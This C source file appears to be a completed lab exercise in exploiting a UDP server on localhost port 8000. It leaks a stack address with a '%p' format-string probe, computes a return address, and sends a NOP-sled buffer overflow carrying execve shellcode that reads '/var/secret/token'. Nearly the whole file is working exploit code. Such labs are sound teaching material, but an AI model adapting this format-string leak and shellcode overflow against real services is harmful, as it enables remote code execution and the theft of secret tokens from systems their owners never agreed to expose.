/* exploit_1.c  */

/* Creates a file containing code for executing "cat /var/secret/token" */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>

char shellcode[]=
  "\x48\x31\xc0"				/* xor     rax,rax			*/
  "\x50"					/* push    rax				*/
  "\x48\xbb\x2f\x2f\x2f\x74\x6f\x6b\x65\x6e"	/* mov     rbx,0x6e656b6f742f2f2f	*/
  "\x53"					/* push    rbx				*/
  "\x48\xbb\x73\x65\x63\x72\x65\x74\x2f\x2f"	/* mov     rbx,0x2f2f746572636573	*/
  "\x53"					/* push    rbx				*/
  "\x48\xbb\x2f\x76\x61\x72\x2f\x2f\x2f\x2f"	/* mov     rbx,0x2f2f2f2f7261762f	*/
  "\x53"					/* push    rbx				*/
  "\x48\x89\xe1"				/* mov     rcx,rsp			*/
  "\x50"					/* push    rax				*/
  "\x48\xbb\x2f\x62\x69\x6e\x2f\x63\x61\x74"	/* mov     rbx,0x7461632f6e69622f	*/
  "\x53"					/* push    rbx				*/
  "\x48\x89\xe7"				/* mov     rdi,rsp			*/
  "\x50"					/* push    rax				*/
  "\x51"					/* push    rcx				*/
  "\x57"					/* push    rdi				*/
  "\x48\x31\xd2"				/* xor     rdx,rdx			*/
  "\x48\x89\xe6"				/* mov     rsi,rsp			*/
  "\xb0\x3b"					/* mov     al,0x3b			*/
  "\x0f\x05"					/* syscall				*/
;

typedef struct {
  int                 sockfd;
  struct sockaddr_in  srv_addr;
  struct sockaddr*    srv_saddr;
  socklen_t           srv_addr_size;
} connection;

connection* create_connection();

/*
 * This sends a message to the target, and waits for a response.
 *
 * msg      an array of bytes, which may have embedded NULLs!
 * msglen   the length of msg, which may not be the same as strlen(msg)
 * conn     how to connect to the target
 * resp     an array of bytes, containing the response from the target
 * resplen  the length of the resp buffer
 *
 * This returns the number of bytes written to resp.
 */
int send_message(void* msg, int msglen, connection* conn, void* resp, int resplen);

int main(int argc, char **argv)
{
  connection* conn;
  ssize_t rcvsize;

  char buffer[517];
  char resp[32];

  /* Initialize buffer with 0x90 (NOP instruction) */
  memset(buffer, 0x90, 517);

  /* Create a UDP socket to communicate with the target server. */
  conn = create_connection();

  /* Send a message to the server, and collect the response. */

  /* TODO: put your code here */

  rcvsize = send_message("%p", 3, conn, resp, sizeof(resp));
  printf("received %d bytes\n", rcvsize);
  printf("Address: %s\n", resp);

  uint64_t str = strtoul(resp, NULL, 16);
  uint64_t rip = str + 1088;  
  uint64_t end = htole64(rip);

  memcpy(buffer + 56, &end, sizeof(end));
  memcpy(buffer + (sizeof(buffer) - sizeof(shellcode)) - 1, shellcode, sizeof(shellcode));
  rcvsize = send_message(buffer, sizeof(buffer), conn, resp, sizeof(resp));

  /* gist for copying one byte array into another:
  memcpy( dest+offset, src, num_bytes );
   */
  
  /* gist for writing a 64-bit unsigned int into a byte array
   * for a little-endian target (regardless of our endianness):
  uint64_t num;
  uint64_t leNum = htole64(num);
  memcpy( dest+offset, &leNum, 8 );
   */

  /* gist for converting a hexadecimal string to a 64-bit unsigned int:
  uint64_t a = strtoul(s,NULL,16);
   */


  return 0;
}

connection* create_connection() {
  connection* retval = malloc(sizeof(connection));
  retval->sockfd = socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP);
  bzero(&retval->srv_addr, sizeof(retval->srv_addr));
  retval->srv_addr.sin_family = AF_INET;
  retval->srv_addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
  retval->srv_addr.sin_port = htons(8000);
  retval->srv_addr_size = sizeof(retval->srv_addr);
  retval->srv_saddr = (struct sockaddr*) &(retval->srv_addr);
  return retval;
}

int send_message(void* msg, int msglen, connection* conn, void* resp, int resplen) {
  ssize_t rcvsize;
  sendto(conn->sockfd, msg, msglen, 0, conn->srv_saddr, conn->srv_addr_size);
  bzero(resp, sizeof(resp));
  rcvsize = recvfrom(conn->sockfd, resp, resplen, MSG_WAITALL, NULL, NULL);
  return rcvsize;
}
